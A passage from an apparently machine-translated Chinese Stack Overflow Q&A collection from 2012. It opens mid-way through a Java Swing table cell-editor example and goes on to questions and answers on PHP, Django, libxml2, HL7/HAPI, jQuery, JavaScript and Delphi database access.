    table.setRowHeight(36);
    table.setAutoCreateRowSorter(true);
    TableColumn column = table.getColumnModel().getColumn(2);
    column.setCellRenderer(new ComboBoxCellRenderer());
    column.setCellEditor(new ComboBoxCellEditor());
    return new JScrollPane(table);
  }
  public static void main(String[] args) {
    EventQueue.invokeLater(new Runnable() {
      @Override public void run() {
        createAndShowGUI();
      }
    });
  }
  public static void createAndShowGUI() {
    JFrame f = new JFrame();
    f.setDefaultCloseOperation(WindowConstants.EXIT_ON_CLOSE);
    f.getContentPane().add(new ComboCellInsetsDemo().makeUI());
    f.setSize(320, 240);
    f.setLocationRelativeTo(null);
    f.setVisible(true);
  }
}

class ComboBoxPanel extends JPanel {
  private String[] m = new String[] {">", "<", "=", "<="};
  protected JComboBox<String> comboBox = new JComboBox<String>(m) {
    @Override public Dimension getPreferredSize() {
      Dimension d = super.getPreferredSize();
      return new Dimension(40, d.height);
    }
  };
  public ComboBoxPanel() {
    super();
    setOpaque(true);
    comboBox.setEditable(true);
    add(comboBox);
  }
}
class ComboBoxCellRenderer extends ComboBoxPanel
                           implements TableCellRenderer {
  public ComboBoxCellRenderer() {
    super();
    setName("Table.cellRenderer");
  }
  @Override public Component getTableCellRendererComponent(
      JTable table, Object value, boolean isSelected,
      boolean hasFocus, int row, int column) {
    setBackground(isSelected?table.getSelectionBackground()
                            :table.getBackground());
    if(value!=null) {
      comboBox.setSelectedItem(value);
    }
    return this;
  }
}
class ComboBoxCellEditor extends ComboBoxPanel
                         implements TableCellEditor {
  public ComboBoxCellEditor() {
    super();
    comboBox.addActionListener(new ActionListener() {
      @Override public void actionPerformed(ActionEvent e) {
        fireEditingStopped();
      }
    });
    addMouseListener(new MouseAdapter() {
      @Override public void mousePressed(MouseEvent e) {
        fireEditingStopped();
      }
    });
  }
  @Override public Component getTableCellEditorComponent(
      JTable table, Object value, boolean isSelected, int row, int column) {
    this.setBackground(table.getSelectionBackground());
    comboBox.setSelectedItem(value);
    return this;
  }

  //Copid from DefaultCellEditor.EditorDelegate
  @Override public Object getCellEditorValue() {
    return comboBox.getSelectedItem();
  }
  @Override public boolean shouldSelectCell(EventObject anEvent) {
    if(anEvent instanceof MouseEvent) {
      MouseEvent e = (MouseEvent)anEvent;
      return e.getID() != MouseEvent.MOUSE_DRAGGED;
    }
    return true;
  }
  @Override public boolean stopCellEditing() {
    if(comboBox.isEditable()) {
      comboBox.actionPerformed(new ActionEvent(this, 0, ""));
    }
    fireEditingStopped();
    return true;
  }

  //Copid from AbstractCellEditor
  //protected EventListenerList listenerList = new EventListenerList();
  transient protected ChangeEvent changeEvent = null;

  @Override public boolean isCellEditable(EventObject e) {
    return true;
  }
  @Override public void  cancelCellEditing() {
    fireEditingCanceled();
  }
  @Override public void addCellEditorListener(CellEditorListener l) {
    listenerList.add(CellEditorListener.class, l);
  }
  @Override public void removeCellEditorListener(CellEditorListener l) {
    listenerList.remove(CellEditorListener.class, l);
  }
  public CellEditorListener[] getCellEditorListeners() {
    return listenerList.getListeners(CellEditorListener.class);
  }
  protected void fireEditingStopped() {
    // Guaranteed to return a non-null array
    Object[] listeners = listenerList.getListenerList();
    // Process the listeners last to first, notifying
    // those that are interested in this event
    for(int i = listeners.length-2; i>=0; i-=2) {
      if(listeners[i]==CellEditorListener.class) {
        // Lazily create the event:
        if(changeEvent == null) changeEvent = new ChangeEvent(this);
        ((CellEditorListener)listeners[i+1]).editingStopped(changeEvent);
      }
    }
  }
  protected void fireEditingCanceled() {
    // Guaranteed to return a non-null array
    Object[] listeners = listenerList.getListenerList();
    // Process the listeners last to first, notifying
    // those that are interested in this event
    for(int i = listeners.length-2; i>=0; i-=2) {
      if(listeners[i]==CellEditorListener.class) {
        // Lazily create the event:
        if(changeEvent == null) changeEvent = new ChangeEvent(this);
        ((CellEditorListener)listeners[i+1]).editingCanceled(changeEvent);
      }
    }
  }
} 
```

* * *

## 回答 #2

> 赞同：7
> 
> 时间：2012-10-11T12:14:41.500

```
includeColumn.setCellEditor(new DefaultCellEditor(new JCheckBox())); 
```

*   没有理由在 中使用或编写`Renderer`and `Editor`for `JCheckBox`，`JTable`放在那里`true`/ `false`，因为[JTable 也内置了对as`JCheckbox`的`Renderer`支持`Editor`](http://docs.oracle.com/javase/tutorial/uiswing/components/table.html#editrender)

*   覆盖适当的`column`，`returns Boolean.Class`

*   用于`JComboBox`阅读[使用组合框作为编辑器](http://docs.oracle.com/javase/tutorial/uiswing/components/table.html#combobox)

*   每个数据都存储在[XxxTableModel](http://docs.oracle.com/javase/tutorial/uiswing/components/table.html#data)中，并通过使用`DefaultTableModel`事件自动显示在`JTables view`

*   [XxxTableModel](http://docs.oracle.com/javase/tutorial/uiswing/components/table.html#data)的所有更新都必须在[事件调度线程上完成](http://docs.oracle.com/javase/tutorial/uiswing/concurrency/dispatch.html)

# php - PHP - 动态 3 列结果表

> ID：12839202
> 
> 赞同：1
> 
> 时间：2012-10-11T12:09:40.077
> 
> 标签：php

我有这个脚本，它产生一个 3 列的结果表：

```
$cols = 3;
$row = 0;
$column = 0;
$count = 0;

echo '<table>';
while($row = mysql_fetch_assoc($result)) {
   $count++;
   if ($column == 0) {
      echo '<tr>';
   }
   echo "<td>$row['dbField']</td>";
   $column++;
   if ($column >= $cols) {
      $row++;
      echo '</tr>';
      $column = 0;
   }
}
echo '</table>'; 
```

这工作正常，除非只有 1 个结果，它只打印一个单元格。我希望它完成第 3 行，所以在这种情况下，两个单元格将是空的。

我将记录的总数存储在会话变量中`$_SESSION['r_count']`，并认为在上述`$column++`部分之后添加以下代码段相当简单：

```
if ($count == $_SESSION['r_count'] && $column < $cols) {
    echo '<td></td>';
    $column++;
} 
```

我想错了。谁能建议我如何正确修改它？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-11T12:26:05.650

如果您知道行数（即`mysql_num_rows()`）：

```
for ($i = 0, $n = ceil($nr_of_rows / $cols); $i != $n; ++$i) {
    $row = mysql_fetch_assoc($result);
    if ($i % $cols == 0) { echo '<tr>'; }
    echo '<td>', $row ? htmlspecialchars($row['dbField']) : '', '</td>';
    if (($i + 1) % $cols == 0) { echo '</tr>'; }
} 
```

# netbeans - Netbeans 中用于 ClearCase 操作的快捷方式

> ID：12839204
> 
> 赞同：0
> 
> 时间：2012-10-11T12:09:46.257
> 
> 标签：netbeans, clearcase

ClearCase 操作是否有键盘快捷键？特别是我正在寻找劫持文件的快捷方式。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-11T12:15:00.720

您可以查看 Netbeans 的这个 Clearcase 插件 [ [http://netbeans.org/kb/docs/ide/clearcase.html](http://netbeans.org/kb/docs/ide/clearcase.html) ]。它确实带有 Netbeans 中的一些键绑定，您也可以在 Netbeans 键绑定编辑器中编辑键绑定。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-10-11T12:18:57.257

您不需要“ClearCase 快捷方式”来劫持文件，您只需要通过操作系统（Windows/Linux/Mac ...）使该文件可写。
这足以使 ClearCase 中的文件“被劫持”，因为您没有通过常规的“cleartool checkout”进行操作。

如果你需要一个 Netbeans 插件，我会推荐“ [**netbeans-command-shortcuts**](http://code.google.com/p/netbeans-command-shortcuts/) ”：

![使可写](../Images/61eb5ba0448ef7680cbfd0c27cfa269e.png)

您可以为“make writable”命令分配一个快捷方式（参见[wiki “Configuration”](http://code.google.com/p/netbeans-command-shortcuts/wiki/Configuration)）：

![捷径](../Images/f98a1524a001510ea6dba479831e000f.png)

# php - 如何减少此功能的代码

> ID：12839207
> 
> 赞同：0
> 
> 时间：2012-10-11T12:10:00.580
> 
> 标签：php, reduce

输入数组`$items`：

```
Array
(
    [0] => Array
        (
            [id] => 2
        )
    [1] => Array
        (
            [id] => 5
        )
) 
```

* * *

的结果`print_r(foo($items))`

```
Array
(
    [2] => 1
    [5] => 1
) 
```

* * *

功能`foo()`

```
function foo($items)
{
    $result = array();
    foreach($items => $array)
    {
        $result[$array['id']] = TRUE;
    }
    return $result;
} 
```

我怎样才能简单地用标准的 PHP 函数编写这个数组转换，比如`array_flip()`或其他东西。可能吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-11T13:43:03.000

```
$r = array_combine( 
  array_map(function($i){ return $i['id']; }, $items), // <-- key
  array_fill(0, count($items), true /* or 1 */)        // <-- value
); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-11T13:38:25.197

使用内置 PHP 函数只会引入额外函数调用的不必要开销。您编写的内容已经是从给定输入创建所需输出的有效方法。

如果可能，我建议使用您的自定义函数。

# python - AttributeError：“设置”对象没有属性“ROOT_URLCONF”

> ID：12839213
> 
> 赞同：25
> 
> 时间：2012-10-11T12:10:11.757
> 
> 标签：python, django, settings, localhost, attributeerror

继我的上一个问题[Error: No module named psycopg2.extensions](https://stackoverflow.com/questions/12728004/error-no-module-named-psycopg2-extensions)之后，我已将我的 mac OS 更新为 Mountain Lion 并安装了 Xcode。我还使用“sudo port install py27-psycopg2”安装了 psycopg2。我现在正在尝试运行“python manage.py runserver”但收到此错误

```
AttributeError: 'Settings' object has no attribute 'ROOT_URLCONF' 
```

有关如何解决此问题并让我的本地主机运行的任何帮助？

* * *

## 回答 #1

> 赞同：16
> 
> 时间：2012-10-11T12:14:05.543

来自 django[文档](https://docs.djangoproject.com/en/1.4/ref/settings/#root-urlconf)：

> Django 设置文件包含 Django 安装的所有配置。当你使用 Django 时，你必须告诉它你正在使用哪些设置。通过使用环境变量`DJANGO_SETTINGS_MODULE`.
> 
> 的值`DJANGO_SETTINGS_MODULE`应采用 Python 路径语法，例如`mysite.settings`. 请注意，设置模块应位于 Python 导入搜索路径中。

和

> **ROOT_URLCONF**
> 
> *默认值：未定义*
> 
> 代表根 URLconf 的完整 Python 导入路径的字符串。例如：“mydjangoapps.urls”。可以通过在传入的 HttpRequest 对象上设置属性 urlconf 在每个请求的基础上覆盖。有关详细信息，请参阅[Django 如何处理请求](https://docs.djangoproject.com/en/1.4/topics/http/urls/#how-django-processes-a-request)。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2018-10-21T10:33:17.230

如果您正在处理 Django 项目，则项目的根（`ROOT_URLCONF=`变量）未在`settings.py`文件中定义，或者至少未正确定义。

如果您没有`settings.py`文件，此代码块应该可以解决问题：

```
from django.conf import settings

settings.configure(
# ...
    ROOT_URLCONF=__name__,
# ...
    ),
) 
```

这样做是指定项目的根目录，`runserver`知道在哪里可以找到您的项目。

如果确实有`settings.py`文件，则找到该变量并添加`__name__`到其中。

* * *

## 回答 #3

> 赞同：4
> 
> 时间：2021-05-12T17:01:10.880

如果您使用多个设置文件，请务必在所有其他设置文件中导入基本设置。这就是我得到这个错误的原因。

# c - 使用 libxml2 的 C 代码在 Win 7 上的 cygwin 上给出编译时错误

> ID：12839230
> 
> 赞同：0
> 
> 时间：2012-10-11T12:10:57.920
> 
> 标签：c, xml, gcc, cygwin, libxml2

我正在尝试在我的 Win 7 机器上使用 cygwin 上的 libxml2 在 C 中编写一个 xml 解析器。当我试图编译代码时，它会给我编译时错误。有人可以帮我解决这个问题。

```
ad@ad-PC /cygdrive/c/Users/ad/Desktop
$ gcc xmlparser.c -I /cygdrive/c/Users/ad/Desktop/libxml2-2.7.8.win32/include/ -L /cygdrive/c/Users/ad/Desktop/libxml2-2.7.8.win32/lib/libxml2.lib -o pxml
In file included from /cygdrive/c/Users/ad/Desktop/libxml2-2.7.8.win32/include/libxml/parser.h:807,
             from xmlparser.c:8:
/cygdrive/c/Users/ad/Desktop/libxml2-2.7.8.win32/include/libxml/encoding.h:28:19: iconv.h: No such file or directory
In file included from /cygdrive/c/Users/ad/Desktop/libxml2-2.7.8.win32/include/libxml/parser.h:807,
             from xmlparser.c:8:
/cygdrive/c/Users/ad/Desktop/libxml2-2.7.8.win32/include/libxml/encoding.h:146: error: parse error before "iconv_t"
/cygdrive/c/Users/ad/Desktop/libxml2-2.7.8.win32/include/libxml/encoding.h:146: warning: no semicolon at end of struct or union
/cygdrive/c/Users/ad/Desktop/libxml2-2.7.8.win32/include/libxml/encoding.h:147: warning: data definition has no type or storage class
xmlparser.c: In function `main':
xmlparser.c:21: error: `filename' undeclared (first use in this function)
xmlparser.c:21: error: (Each undeclared identifier is reported only once  
xmlparser.c:21: error: for each function it appears in.)
xmlparser.c:29: error: parse error before ')' token
xmlparser.c: At top level:
xmlparser.c:34: error: parse error before string constant
xmlparser.c:34: error: conflicting types for 'printf'
xmlparser.c:34: note: a parameter list with an ellipsis can't match an empty parameter name list declaration
xmlparser.c:34: error: conflicting types for 'printf'
xmlparser.c:34: note: a parameter list with an ellipsis can't match an empty parameter name list declaration
xmlparser.c:34: warning: data definition has no type or storage class 
```

编码 ：：

```
# include <stdio.h>
# include <stdlib.h>
# include <libxml/parser.h>

int main(int argc, char **argv)
{
    xmlDoc *document;
    xmlNode *root , *node , *first_child;

    if(argc < 2) 
    {
        printf("\n Error No filename specified \n");
        return 1;
    }

    filename = argv[1];

    document = xmlReadFile(filename,NULL,0);
    root = xmlDocGetRootElement(document);

    printf("\n Root is ::%s:: <%i> \n",root->name,root->type);
    first_child = root->children;

    for(node = first_child;node,node = node->next)
    {
        printf("\n Child is ::%s:: <%i> \n",node -> name, node->type);
    }

    printf("\n END \n");
    return 0;
    } 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-11T12:19:54.137

错误消息明确表示`filename`未声明，但您正在尝试在此处使用它：

```
filename = argv[1]; 
```

这里还有一个错误的标点符号：

```
for(node = first_child;node,node = node->next) 
```

它必须`;`代替`,`.

# javascript - 从cgi生成的帧中处理一个帧？

> ID：12839232
> 
> 赞同：0
> 
> 时间：2012-10-11T12:11:07.713
> 
> 标签：javascript, html, web-applications, cgi

我用 3 个框架构建了一个 html 页面。我的第一个框架在组合框中包含一个具有可变内容的表单。所以我用cgi-skript生成它。当我提交表单时，我希望第二个 cgi 脚本的结果在我的第二个框架中发送。但似乎我无法通过简单地添加 target="framename"-attribute 来解决第二帧。我认为这是因为生成的框架与硬编码的 html 页面的来源不同。

有谁知道我如何将第二个 cgi 脚本的响应发送到第二个帧？或者有没有办法在html页面的定义部分发送响应，例如在某些脚本标签中？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-15T05:49:44.560

抱歉，这不是“真正的”问题。我也尝试在本地 IIS 中执行此操作，并通过双击打开 html 文件。问题在于，cgi 脚本和 html 的来源不同（html 文件：///C.. 和 cgi 文件 localhost/cgi-bin/...）。因此，您只需从浏览器 (localhost/...) 调用 html 文件。

# java - 如何在 Java 6 中使用 Java Access Bridge？

> ID：12839235
> 
> 赞同：1
> 
> 时间：2012-10-11T12:11:16.360
> 
> 标签：java, c++, java-access-bridge

我想将 Java Access Bridge 与使用旧版本 Java 运行时环境的应用程序一起使用。（Java 6）

JAB 适用于“公共”JRE (SE 7)。但是目标应用程序有自己的 JRE (SE 6)。Java Monkey 和 Java Ferret 都不会显示有关应用程序的任何信息。

我知道可以从 Java 6 应用程序中获取信息，因为有第三方应用程序使用 JAB 来访问它。我怎样才能做到这一点？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2017-10-06T19:50:00.417

**要在 Java 6 或更低版本中使用 Java Access Bridge，[您需要手动安装 Java Access Bridge 2.0.2](http://docs.oracle.com/javase/accessbridge/2.0.2/setup.htm#jab-installing-java-access-bridge)。**

Java Access Bridge 直到 Java 7 才默认包含在 Java 中。任何早期版本的 Java 都需要手动安装。（请参阅[Oracle 的 JAB 2.0.2 安装指南](http://docs.oracle.com/javase/accessbridge/2.0.2/setup.htm#downloading-jab)）

> Java Access Bridge 已集成到 Java SE 7 Update 6 及更高版本中。因此，您只需要用于 Java SE 6 和更早版本的 Java Access Bridge 2.0.2。
> [[Oracle：Java SE 桌面可访问性](http://www.oracle.com/technetwork/articles/javase/index-jsp-136191.html)]

请参阅：[*Oracle - 安装 Java Access Bridge*](http://docs.oracle.com/javase/accessbridge/2.0.2/setup.htm#jab-installing-java-access-bridge)

# java - HAPI 对段进行排序

> ID：12839238
> 
> 赞同：0
> 
> 时间：2012-10-11T12:11:21.180
> 
> 标签：java, hl7, hapi

我们正在创建一个 HL7 XML 结构并使用 HAPI 库将其输出为 HL7 V2 文件。但不幸的是，HAPI 正在重新排序（排序）这些段。

因为我有 MFE 和 ZBP 总是重复：

```
MSH|...
MFI|...
MFE|...
ZBP|...
MFE|...
ZBP|...
MFE|...
ZBP|... 
```

但是 HAPI 将它们重新排序为

```
MSH|...
MFI|...
MFE|...
MFE|...
MFE|...
ZBP|...
ZBP|...
ZBP|... 
```

它也与[HAPI TestPanel 一起发生](http://hl7api.sourceforge.net/hapi-testpanel/install.html)。例子：

```
MSH|^~\&|||||20121011140541.133+0200||MFN^M01|1|T|2.6
MFI|Partners|^Sap|UIZ|||NE
MFE|MUP|||0000040001
ZBP|0000040001|100|Something||||3000|Bern||||
MFE|MUP|||0000040002
ZBP|0000040002|100|Otherthing||||8000|Zurich|||| 
```

**如何使用 HAPI 禁用重新排序？**

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-12T13:39:44.610

嗯，你有一些事情发生在这里......

首先，您构建细分的方式不符合 HL7 标准。将 Z-Segments 引入消息后，所有后续段都需要是 Z-Segments。因此，您有交替的 MFE 和 ZBP 段这一事实不是一个有效的结构。至少，我建议将 MFE 段更改为自定义段，例如 ZMF 或类似的段。

其次，您拥有的消息结构不是 ADT^A01 消息的结构。您缺少一些必需的段，例如 PID，它们需要在消息中。不遵循消息结构会给您的贸易伙伴带来麻烦，最终也会给您带来麻烦。如果您不确定消息结构是什么，您将需要访问[HL7 站点](https://www.hl7.org)并购买实施指南。

因此，如果您决定不关心标准或您的贸易伙伴不关心，您可以在 hapi 工具中禁用验证。虽然修改 HL7 消息标准是很常见的地方，但*请不要忽略它*。制作自定义消息并大胆地忽略标准给整个领域的集成商带来了巨大的痛苦，并且常常导致脆弱的集成。请记住，这些是医疗保健提供者使用的医疗保健消息，而不是 Twitter API 调用。我们在这里所做的可能会对患者的结果产生影响。

HAPI 站点上有一个[消息验证页面。](http://hl7api.sourceforge.net/xref/ca/uhn/hl7v2/examples/MessageValidation.html)

这基本上是您正在寻找的代码：

```
NoValidation noValidation = new NoValidation();
parser.setValidationContext(noValidation); 
```

在 HAPI TestPanel 中，您可以通过从下拉列表中禁用验证来查看相同的功能。 ![在此处输入图像描述](../Images/8c782ea8a0ea741da829b67e9f8b8c74.png)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-16T13:27:12.937

将 ADT^01 更改为正确的**MFN^M01**并使用它工作的版本**2.3**（也在测试仪中）：

```
MSH|^~\&|||||20121011140541.133+0200||MFN^M01|1|T|2.3
MFI|Partners|^Sap|UIZ|||NE
MFE|MUP|||0000040001
ZBP|0000040001|100|Something||||3000|Bern||||
MFE|MUP|||0000040002
ZBP|0000040002|100|Otherthing||||8000|Zurich|||| 
```

奇怪，但任何其他版本都不起作用。

# php - 在发件人有两封电子邮件的情况下，如何使用 php 发送电子邮件？

> ID：12839241
> 
> 赞同：-1
> 
> 时间：2012-10-11T12:11:33.420
> 
> 标签：php, email

有一个标准说您可以从多个电子邮件地址发送。我的意思是发件人标头可以有多个电子邮件地址。

[https://www.rfc-editor.org/rfc/rfc5322#section-3.6.2](https://www.rfc-editor.org/rfc/rfc5322#section-3.6.2)

我尝试了不同的`mail`功能组合，但都没有奏效。

```
<?php
$to      = 'nobody@example.com';
$subject = 'the subject';
$message = 'hello';
$headers = 'From: webmaster@example.com, dat@teddy.com' . "\r\n" .
    'Reply-To: webmaster@example.com' . "\r\n" .
    'X-Mailer: PHP/' . phpversion();

mail($to, $subject, $message, $headers);
?>

<?php
$to      = 'nobody@example.com';
$subject = 'the subject';
$message = 'hello';
$headers = 'From: webmaster@example.com' . "\r\n" . 'From: dat@teddy.com' . "\r\n"
    'Reply-To: webmaster@example.com' . "\r\n" .
    'X-Mailer: PHP/' . phpversion();

mail($to, $subject, $message, $headers);
?> 
```

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-10-11T12:15:21.483

试试这个，希望它会工作

```
$headers =  "From: Website  <webmaster@example.com,dat@teddy.com> \r\n"; 
```

或这个

```
$headers =  "From: WebMaster <webmaster@example.com>, Dat<dat@teddy.com> \r\n"; 
```

# java - 改变你“标签”java的数量？

> ID：12839242
> 
> 赞同：1
> 
> 时间：2012-10-11T12:11:34.467
> 
> 标签：java, swing, tabs, joptionpane

如上。我有一个模态 JOptionPane，它使用文本区域来显示比正常消息稍大的消息。窗格工作正常，目前大约 300 平方像素。问题是我正在尝试输出类似于以下内容的内容：

```
Amt (TAB HERE) x (TAB HERE) Type (TAB HERE) Price (TAB HERE) 
```

同样，我对实际面板完全没有问题，它以我想要的大小显示，但由于某种原因，它“标签”真的很远。就像 JOptionPane 的 1/3 一样，它在 Type 之后切断，我失去了一半的文本。有什么办法可以指定我想要的标签的大小吗？我尝试使用空格手动对齐，但您可以想象并非所有字母的宽度都相同，而且很难让它正确对齐，所以我需要制表符。我也不想和新的布局管理器混在一起。我只是在一个方法中连接一个字符串，将它返回到 JTextArea，然后将它放在我的 JOptionPane 中，所以我想要一个可以做到这一点的解决方案。如果我输出到命令行，选项卡看起来很正常，可能是 5 个奇怪的字符，但以这种方式执行它更像是 2 个字长......

更糟糕的情况是我制作了一个更大的 JOptionPane，但为了美观我不希望这样做。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-10-11T12:36:51.023

你可以把一个 HTML 表格放在你`JTextArea`喜欢的[地方](http://docs.oracle.com/javase/tutorial/uiswing/components/html.html)。a`JTextArea`或 a`JTable`都可以放入 a 中`JOptionPane`。

# javascript - 项目悬停显示所有项目的隐藏文本

> ID：12839243
> 
> 赞同：2
> 
> 时间：2012-10-11T12:11:37.403
> 
> 标签：javascript, jquery, html, hover

我正在使用这个脚本来动画/显示项目的隐藏文本：

```
/* Artworks Hide/show text */
$(".item").hover(function() {
    //fadein second image using jQuery fadeIn 
$(".item .art_title").fadeIn(200);
    }, function () {
//fadein first image using jQuery fadeIn
    $(".item .art_title").fadeOut(200);
}); 
```

这是 HTML：

```
 <div class="item">
                <img src="img/artwork1.jpg" alt="artwork1" width="240" height="173">
                <div class="art_title">
                    <p>SWEET LIFE</p>
                </div>
                <div class="mask"></div>
            </div> 
```

问题是当我将鼠标悬停在一个项目上时，它会显示所有项目的隐藏文本！如何修复只显示我悬停的项目的文本？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-11T12:14:31.953

尝试将其更改为`$(this).find(".art_title").fadeIn(200);` 并相应地，`$(this).find(".art_title").fadeOut(200);`

您当前正在选择所有具有类 art-title 的元素。您希望悬停的元素中的所有元素都具有类 art-title。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-10-11T12:13:54.980

尝试这个：

```
/* Artworks Hide/show text */
$(".item").hover(function () {
    //fadein second image using jQuery fadeIn 
    $(this).find('.art_title').fadeIn(200);
}, function () {
    //fadein first image using jQuery fadeIn
    $(this).find('.art_title').fadeOut(200);
}); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-10-11T13:12:15.533

发生这种情况是因为您在 jQuery 代码中使用了选择器类。你也可以试试：

```
$('.item').mouseenter(function() {

    $(this).find('.art_title').fadeIn(200); 

}).mouseleave(function() {

    $('.art_title').fadeOut(200);
}); 
```

# php - Tal 条件，在同一行内定义多个条件

> ID：12839249
> 
> 赞同：2
> 
> 时间：2012-10-11T12:11:56.477
> 
> 标签：php, phptal, template-tal

有没有替代我在下面做的事情：

```
...
<div class="abc" tal:condition="this/condition1">
    <div class="abc2" tal:condition="this/condition2">
    ...
    </div>
</div>
... 
```

如 ：

```
...
<div class="abc" tal:condition="this/condition1 AND this/condition2">
...
</div>
... 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-10-12T22:24:41.973

这有点傻，但在 TALES 中没有逻辑与。

您可以使用`php:`前缀：

```
<div tal:condition="php:this.condition1 AND this['condition2']"> 
```

但请记住，`php:`您需要使用类型相关的语法（`.`对于对象，`[]`对于数组，因为`/`变成除法）。

# javascript - 有什么方法可以缩短这种连锁电话吗？

> ID：12839256
> 
> 赞同：4
> 
> 时间：2012-10-11T12:12:28.493
> 
> 标签：咖啡脚本, javascript

有没有办法缩短这种连锁电话？

```
if (obj && obj.prop && obj.prop.subProp1 && obj.prop.subProp1.subPropFunc) {
    obj.prop.subProp1.subPropFunc();
} 
```

我能想象的唯一选择是`try-catch`. 还有其他想法吗？
*我真的厌倦了写这些。在[咖啡脚本](/questions/tagged/coffeescript "显示标记为“咖啡脚本”的问题")中使用`?.`.

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-11T12:28:34.457

考虑到您的示例代码，这应该可以工作（没有测试“所有案例”，只是您的示例的副本）：

```
function propsExist(obj) {
    if (!obj) return false;
    for (var i = 1; i < arguments.length; i++) {
        if (!obj[arguments[i]]) return false;
        obj = obj[arguments[i]];
    }
    return true;
}

if (propsExist(obj, "prop", "subProp1", "subPropFunc")) {
    obj.prop.subProp1.subPropFunc();
} 
```

该方法`propsExist()`采用可变数量的参数，其中第一个是您要检查属性/函数的原始对象。它将遍历您发送给它的属性列表并按顺序检查它们。如果一个不存在，它将返回`false`。如果它通过整个循环，则验证成功！

如果您*总是*想在验证时调用子属性的函数，您也可以只更改`propsExist`函数以调用它而不是返回 true （然后将函数重命名为`callIfValid(obj, ...)`

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-10-11T12:31:56.500

与上一篇文章相同的想法，只是一个不同的解决方案。

```
function checkChain(variablePath,startingPoint){
    var check = startingPoint || window,
        parts =  variablePath.split("."),
        i;

    for (i=0;i<parts.length;i++) {
        check = check[parts[i]];
        if (!check) {
            return null;
        }
    }
    return check;
}

var foo = { bar : { cat : { says : function(x){ alert(x); } } } };

var test1 = checkChain("foo.bar.cat.says");
if (test1) {
    test1("meow");
}

var test2 = checkChain("foo.bar.cat.bark");
if (test2) {
    test2("burp");
}

var test3 = checkChain("cat.says",foo.bar);
if (test3) {
    test3("huh?");
} 
```

# sql-server - Delphi 连接到 SQL Server - BDE 的“面向未来”的替代品？

> ID：12839257
> 
> 赞同：4
> 
> 时间：2012-10-11T12:12:34.123
> 
> 标签：sql-server, delphi, ado, native, bde

我们有一个大小（大约 1MLOC）的应用程序，它是在 BDE 即将被弃用的时候开始的。现在我们只使用它来使用 ODBC 连接到 SQL Server。尽管它已被弃用，但它的运行却出人意料地好，而且它很可能会继续运行 15 年。但是，没有人知道它是否或何时停止工作。如果它停止，Embarcadero 将无能为力。所以，这是一颗定时炸弹，我们需要更换它。但是用什么？

Delphi 中的 ADO 组件看起来很有前途。有类似于 BDE 组件的表和查询组件，它们不是由可能失去兴趣的单人商店制造的第三方组件。我们也期待使用连接字符串而不是笨拙的 ODBC-Administrator。

然而，大约一年前，微软宣布不推荐使用 OLE DB，对于原生开发，我们应该使用 SQL Server Native Client ODBC 驱动程序。

所以，我的问题是，Delphi 中的 ADO 组件是否与 OLD DB 硬连线？或者，如果我们在驱动程序列表中选择“SQL Server Native Client”，我们会不会使用 OLE DB？

我希望/担心要使用 SQL Server Native Client ODBC 驱动程序，我们必须像现在一样在 ODBC-Adminstrator 中设置数据源。或者是否可以使用连接字符串与 ODBC 连接？

还有哪些 Delphi 组件可以在不使用 OLE DB 的情况下连接到 ODBC？是的，我知道 dbExpress，但看起来我们需要数年才能从 BDE 转换到它。

谢谢，陆鲨

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-10-11T15:20:53.600

5 年前，我们有类似的迁移需求，并对其进行了大量研究和测试。从 BDE 迁移到 SDAC 的最简单途径是从 devart (http://www.devart.com/sdac/)。Devart 有一个 BDE 替换实用程序，它检查您的代码并将 BDE 组件替换为等效的 SDAC 组件。它将使您到达那里大约 90% 的位置，然后您必须手动进行一些更改才能使一切正常工作（例如，如果您使用 fetchall，则必须注释掉所有 fetchall 代码 - 但您会看到一个模式并且可以修复其余代码主要通过搜索和替换）。SDAC 组件的性能非常好，它们支持所有 sql server 调用，并且您可以通过 Internet 使用加密连接。这些组件支持与 SQL Server 的本机 SQL 或 OLEDB 连接。它们还使用缓存更新在分离模式下工作。如果您计划支持除 SQL Server 之外的其他数据库平台，另一种选择是使用 UniDac - 它就像 SDAC，但可以与 SQL Server、Oracle 和其他平台一起使用 - 非常类似于旧的 BDE，没有开销。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-10-11T12:52:24.443

1）“本机连接”并不意味着使用 ODBC 或 OLE DB，也不意味着使用 BDE 和 DBX。本机连接意味着使用只能连接到 MS SQL 并且不使用任何与服务器无关的标准管道的特殊库。相反，BDE 和 DBX 以及 ADO 和 ODBC 是通用库，可提供与您安装插件的任何服务器的连接。

通常，本机库为您提供与服务器的更紧密集成，并使用通用库可能错过的一些功能（如 firebird/interbase 服务器中的事件）。它们还可以更快地工作，因为它们不需要将数据流和命令转码到管道公共 API 标准/从管道公共 API 标准转码。

公共接口 OTOH 可帮助您更轻松地切换服务器并更轻松地开发与服务器无关的应用程序。

2) 为什么你认为 BDE -> DBX 转换比 BDE -> ODBC 或 BDE -> ADO 或 BDE-> 什么都难？转换就是转换。ADO 也有它的限制和陷阱，比如 DBX 和任何其他库。

3) DBX 有 MS SQL 插件。DevArt 提供了他们的一套 DBX 插件，并且可能提供比现有的 Delphi DBX MS SQL 支持更好的一个。或者可能不是。

4）除此之外，很少有知名的与服务器无关的库

*   ZeosLib - FLOSS，但对最近的 Delphi 版本的支持很差。永恒的阿尔法。
*   AnyDAC - [http://www.da-soft.com/anydac](http://www.da-soft.com/anydac)，商业，知名
*   UniDAC - [http://www.devart.com/unidac](http://www.devart.com/unidac)，商业，知名

